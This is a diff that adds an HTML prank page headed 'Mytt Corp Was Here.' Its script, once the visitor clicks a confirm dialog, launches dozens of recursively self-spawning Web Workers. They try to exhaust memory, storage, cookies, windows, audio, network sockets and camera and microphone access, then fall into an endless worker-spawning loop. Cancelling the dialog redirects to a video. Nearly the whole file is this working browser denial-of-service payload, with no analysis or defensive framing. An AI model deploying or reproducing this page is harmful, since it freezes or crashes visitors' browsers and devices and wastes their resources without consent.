@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Screwed.</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>  
+    <h1>Mytt Corp Was Here.</h1>
+ <script>
+var c = confirm("?");
+if (c) {
+    alert("Just Why?");
+    setTimeout(() => {
+        var w1 = 'while(true){new SharedArrayBuffer(1024*1024*1024*4);}';
+        var w2 = 'while(true){new ArrayBuffer(1024*1024*1024*4);}';
+        var w3 = 'while(true){new Float64Array(1024*1024*1024*2);}';
+        var w4 = 'while(true){}';
+        var w5 = 'while(true){new Worker(URL.createObjectURL(new Blob(["while(true){}"])));}';
+        
+        var memSAB = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w1 + '"])));',
+            'new SharedArrayBuffer(1024*1024*1024*4);',
+            '}'
+        ])));
+        
+        var memAB = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w2 + '"])));',
+            'new ArrayBuffer(1024*1024*1024*4);',
+            '}'
+        ])));
+        
+        var memFloat = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w3 + '"])));',
+            'new Float64Array(1024*1024*1024*2);',
+            '}'
+        ])));
+        
+        var gpuCanvas = new Worker(URL.createObjectURL(new Blob([
+            'var c=document.createElement("canvas");',
+            'c.width=262144;c.height=262144;',
+            'var ctx=c.getContext("2d");',
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'for(var i=0;i<10000;i++)ctx.fillRect(0,0,c.width,c.height);',
+            '}'
+        ])));
+        
+        var domCreate = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'for(var i=0;i<50000;i++){',
+            'var d=document.createElement("div");',
+            'd.innerHTML="<div>".repeat(10000);',
+            'document.body.appendChild(d);',
+            '}',
+            '}'
+        ])));
+        
+        var storeLocal = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'localStorage.clear();',
+            'for(var i=0;i<100000;i++)localStorage.setItem("x"+i,"0".repeat(1024*1024*20));',
+            '}'
+        ])));
+        
+        var winOpen = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'for(var i=0;i<1000;i++)window.open("","","width=100000,height=100000");',
+            '}'
+        ])));
+        
+        var audioOsc = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var a=new (window.AudioContext||window.webkitAudioContext)();',
+            'for(var i=0;i<1000;i++){',
+            'var o=a.createOscillator();',
+            'o.connect(a.destination);',
+            'o.start();',
+            '}',
+            '}'
+        ])));
+        
+        var historySpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'history.pushState({},"","#");',
+            'history.replaceState({},"","#");',
+            '}'
+        ])));
+        
+        var cookieFlood = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'document.cookie="c="+"x".repeat(10000000)+";path=/";',
+            '}'
+        ])));
+        
+        var iframeRec = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var i=document.createElement("iframe");',
+            'i.srcdoc=\'<script>while(true){new Worker(URL.createObjectURL(new Blob(["while(true){}"])));}<\\/script>\';',
+            'document.body.appendChild(i);',
+            '}'
+        ])));
+        
+        var dbWrite = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var r=indexedDB.open("x",1);',
+            'r.onupgradeneeded=function(e){var d=e.target.result;for(var i=0;i<100;i++)d.createObjectStore("s"+i);};',
+            'r.onsuccess=function(e){var d=e.target.result;for(var i=0;i<100;i++){var t=d.transaction(["s"+i],"readwrite");t.objectStore("s"+i).add({d:new ArrayBuffer(1024*1024*100)});}};',
+            '}'
+        ])));
+        
+        var scriptInject = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var b=new Blob(["while(true){}"],{type:"application/javascript"});',
+            'var u=URL.createObjectURL(b);',
+            'for(var i=0;i<1000;i++){var s=document.createElement("script");s.src=u;document.head.appendChild(s);}',
+            '}'
+        ])));
+        
+        var msgChannel = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var ch=new MessageChannel();',
+            'ch.port1.onmessage=function(){ch.port2.postMessage("x".repeat(10000000));};',
+            'ch.port2.onmessage=function(){ch.port1.postMessage("x".repeat(10000000));};',
+            'for(var i=0;i<10000;i++)ch.port1.postMessage("x".repeat(10000000));',
+            '}'
+        ])));
+        
+        var svgDraw = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var s=document.createElementNS("http://www.w3.org/2000/svg","svg");',
+            's.setAttribute("width","100000");s.setAttribute("height","100000");',
+            'for(var i=0;i<10000;i++){',
+            'var c=document.createElementNS("http://www.w3.org/2000/svg","circle");',
+            'c.setAttribute("cx",i*100);c.setAttribute("cy",i*100);c.setAttribute("r","1000");',
+            's.appendChild(c);',
+            '}',
+            'document.body.appendChild(s);',
+            '}'
+        ])));
+        
+        var formSubmit = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var f=document.createElement("form");',
+            'f.action="about:blank";f.method="POST";',
+            'for(var i=0;i<10000;i++){',
+            'var inp=document.createElement("input");',
+            'inp.name="f"+i;inp.value="x".repeat(100000);',
+            'f.appendChild(inp);',
+            '}',
+            'document.body.appendChild(f);',
+            'f.submit();',
+            '}'
+        ])));
+        
+        var pointerToggle = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'document.body.requestPointerLock();',
+            'document.exitPointerLock();',
+            '}'
+        ])));
+        
+        var fullscreenToggle = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'document.documentElement.requestFullscreen();',
+            'document.exitFullscreen();',
+            '}'
+        ])));
+        
+        var winResize = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'window.resizeTo(100000,100000);',
+            'window.moveTo(100000,100000);',
+            '}'
+        ])));
+        
+        var winScroll = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'window.scrollTo(100000,100000);',
+            '}'
+        ])));
+        
+        var eventSpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'for(var e of["click","mousemove","keydown","scroll","resize"]){',
+            'for(var i=0;i<10000;i++)window.dispatchEvent(new Event(e));',
+            '}',
+            '}'
+        ])));
+        
+        var consoleFlood = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'console.clear();',
+            'console.log(" ".repeat(100000000));',
+            '}'
+        ])));
+        
+        var cssAnim = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var st=document.createElement("style");',
+            'st.textContent="*{animation:x 0.000001s infinite;}@keyframes x{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}";',
+            'document.head.appendChild(st);',
+            '}'
+        ])));
+        
+        var videoSpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var v=document.createElement("video");',
+            'v.src="data:video/webm;base64,"+"GkXfo59ChoEBQveBAULygQRC84EIQoKEd2VibUKHgQJChYECGFOAZwEAAAAAAAHTEU2bdLpNu4tTq4QVSalmU6yBoU27i1OrhBZUrmtTrIHGTbuMU6uEElTDZ1OsggEXTbuMU6uEHFO7a1OsggG97AEAAAAAAABZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVSalmoCrXsYMPQkBNgIRMYXZmV0GETGF2ZkSJiEBEAAAAAAAAFlSua8yuAQAAAAAAAEPXgQFzxYgAAAAAAAAAAAAAAAREAAAAAAAATnBbigRC84EIBVNNgoEBRveBAA3PCUAJk5wj4EBC85kZ4EBC85kZoEAVSalmoCrXsYMPQkBNgIRMYXZmV0GETGF2ZkSJiEBEAAAAAAAAFlSua8yuAQAAAAAAAEPXgQFzxYgAAAAAAAAAAAAAAAREAAAAAAAAA".repeat(10000);',
+            'v.loop=true;v.autoplay=true;',
+            'document.body.appendChild(v);',
+            '}'
+        ])));
+        
+        var fetchSpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'for(var i=0;i<10000;i++)fetch("data:text/html,"+"x".repeat(10000000),{mode:"no-cors"});',
+            '}'
+        ])));
+        
+        var wsFlood = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var w=new WebSocket("wss://echo.websocket.events");',
+            'w.onopen=function(){while(true)w.send("x".repeat(10000000));};',
+            '}'
+        ])));
+        
+        var xhrSpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var x=new XMLHttpRequest();',
+            'x.open("GET","data:text/html,"+"x".repeat(10000000));',
+            'x.send();',
+            '}'
+        ])));
+        
+        var atomicOps = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var s=new SharedArrayBuffer(1024*1024*1024);',
+            'var a=new Int32Array(s);',
+            'for(var i=0;i<a.length;i++)Atomics.add(a,i,1);',
+            '}'
+        ])));
+        
+        var mediaRec = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(s){',
+            'while(true)new MediaRecorder(s).start();',
+            '});',
+            '}'
+        ])));
+        
+        var geoSpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'navigator.geolocation.getCurrentPosition(function(){},function(){});',
+            'navigator.geolocation.watchPosition(function(){},function(){});',
+            '}'
+        ])));
+        
+        var notifySpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'new Notification("",{body:" ".repeat(10000000)});',
+            '}'
+        ])));
+        
+        var batterySpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'navigator.getBattery().then(function(b){',
+            'while(true)b.addEventListener("chargingchange",function(){});',
+            '});',
+            '}'
+        ])));
+        
+        var vibrateSpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'navigator.vibrate([1000,1000,1000,1000,1000,1000,1000,1000,1000,1000]);',
+            '}'
+        ])));
+        
+        var storageSpam = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'navigator.storage.persist();',
+            '}'
+        ])));
+        
+        var webglBuf = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var c=document.createElement("canvas");',
+            'var g=c.getContext("webgl")||c.getContext("experimental-webgl");',
+            'if(g){',
+            'while(true){',
+            'var b=g.createBuffer();',
+            'g.bindBuffer(g.ARRAY_BUFFER,b);',
+            'g.bufferData(g.ARRAY_BUFFER,new Float32Array(100000000),g.STATIC_DRAW);',
+            '}',
+            '}',
+            '}'
+        ])));
+        
+        var objCreate = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var o={};',
+            'for(var i=0;i<1000000;i++)o[i]="x".repeat(10000);',
+            '}'
+        ])));
+        
+        var mathCalc = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var s=0;',
+            'for(var i=0;i<1000000000;i++)s+=Math.sin(i)*Math.cos(i);',
+            '}'
+        ])));
+        
+        var storeSession = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'sessionStorage.clear();',
+            'for(var i=0;i<100000;i++)sessionStorage.setItem("y"+i,"1".repeat(1024*1024*20));',
+            '}'
+        ])));
+        
+        var imgCreate = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var img=new Image();',
+            'img.src="data:image/svg+xml,<svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"100000\\" height=\\"100000\\"><rect width=\\"100000\\" height=\\"100000\\" fill=\\"red\\"/></svg>";',
+            'document.body.appendChild(img);',
+            '}'
+        ])));
+        
+        var textCreate = new Worker(URL.createObjectURL(new Blob([
+            'while(true){',
+            'new Worker(URL.createObjectURL(new Blob(["' + w4 + '"])));',
+            'var t=new Text(" ".repeat(10000000));',
+            'document.body.appendChild(t);',
+            '}'
+        ])));
+        
+        while(true){
+            new Worker(URL.createObjectURL(new Blob([w5])));
+        }
+    }, 100);
+} else {
+    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+}
+    </script>
+</body>
+</html>
